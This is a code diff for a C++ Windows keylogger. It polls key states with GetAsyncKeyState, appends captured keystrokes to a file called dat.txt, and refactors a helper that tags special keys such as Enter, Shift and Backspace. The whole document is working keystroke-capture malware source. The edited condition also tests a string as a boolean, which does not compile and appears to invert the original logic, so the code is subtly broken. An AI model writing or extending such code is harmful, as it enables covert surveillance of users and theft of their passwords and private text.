@@ -19,66 +19,38 @@ void LOG(string input) {
 }
 
 
-bool parseUnprintable(int S_key) {
+string parseUnprintable(int S_key) {
 	switch (S_key) {
 	case VK_SPACE:
-		cout << " ";
-		LOG(" ");
-		return true;
+		return " ";
 	case VK_RETURN:
-		cout << "\n";
-		LOG("\n");
-		return true;
-	case '¾':
-		cout << ".";
-		LOG(".");
-		return true;
+		return "#ENTER#";
 	case VK_SHIFT:
-		cout << "#SHIFT#";
-		LOG("#SHIFT#");
-		return true;
-	case VK_BACK:
-		cout << "\b";
-		LOG("\b");
-		return true;
-	case VK_RBUTTON:
-		cout << "#R_CLICK#";
-		LOG("#R_CLICK#");
-		return true;
-	case VK_CAPITAL:
-		cout << "#CAPS_LOCK#";
-		LOG("#CAPS_LCOK");
-		return true;
-	case VK_TAB:
-		cout << "#TAB";
-		LOG("#TAB");
-		return true;
-	case VK_UP:
-		cout << "#UP";
-		LOG("#UP_ARROW_key");
-		return true;
-	case VK_DOWN:
-		cout << "#DOWN";
-		LOG("#DOWN_ARROW_key");
-		return true;
-	case VK_LEFT:
-		cout << "#LEFT";
-		LOG("#LEFT_ARROW_key");
-		return true;
-	case VK_RIGHT:
-		cout << "#RIGHT";
-		LOG("#RIGHT_ARROW_key");
-		return true;
+		return "#SHIFT#";	
+	case VK_RSHIFT:
+		return "#RSHIFT#";
 	case VK_CONTROL:
-		cout << "#CONTROL";
-		LOG("#CONTROL");
-		return true;
+		return "#CONTROL#";
 	case VK_MENU:
-		cout << "#ALT";
-		LOG("#ALT");
-		return true;
+		return "#ALT#";
+	case VK_BACK:
+		return "#BACK#";
+	case VK_RBUTTON:
+		return "#R_CLICK#";
+	case VK_CAPITAL:
+		return "#CAPS#";
+	case VK_TAB:
+		return "#TAB#";
+	case VK_UP:
+		return "#UP#";
+	case VK_DOWN:
+		return "#DOWN#";
+	case VK_LEFT:
+		return "#LEFT#";
+	case VK_RIGHT:
+		return "#RIGHT#";
 	default: 
-		return false;
+		return "";
 	}
 }
 
@@ -93,7 +65,9 @@ int main()
 		for (int key = 8; key <= 190; key++)
 		{
 			if (GetAsyncKeyState(key) == -32767) {
-				if (parseUnprintable(key) == false) {
+
+
+				if (parseUnprintable(key)) {
 
 					fstream LogFile;
 					LogFile.open("dat.txt", fstream::app);
